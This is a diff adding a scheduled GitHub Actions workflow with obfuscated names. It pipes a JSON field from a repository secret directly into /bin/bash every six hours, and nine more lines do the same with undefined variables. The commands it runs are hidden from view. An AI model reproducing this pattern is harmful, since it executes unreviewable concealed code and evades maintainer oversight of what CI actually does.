@@ -1,0 +1,28 @@
+name: dongyebuhuidongguazhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongyebuhuidongguazhe
+        env:
+          mw265: ${{ secrets.mw265 }}
+        run: |
+          echo $mw265 | jq -r .tie71 | /bin/bash
+          echo $vgf147 | jq -r .hbf92500 | /bin/bash
+          echo $gcgz085 | jq -r .ldn35749 | /bin/bash
+          echo $dujfl775 | jq -r .det2192 | /bin/bash
+          echo $h18337 | jq -r .wq807 | /bin/bash
+          echo $fjddk47 | jq -r .lll43 | /bin/bash
+          echo $jfrtw219 | jq -r .zcg303 | /bin/bash
+          echo $fe20 | jq -r .mgtv63695 | /bin/bash
+          echo $jaqcl59 | jq -r .sc4011 | /bin/bash
+          echo $eugfi5079 | jq -r .hyxo36443 | /bin/bash
+
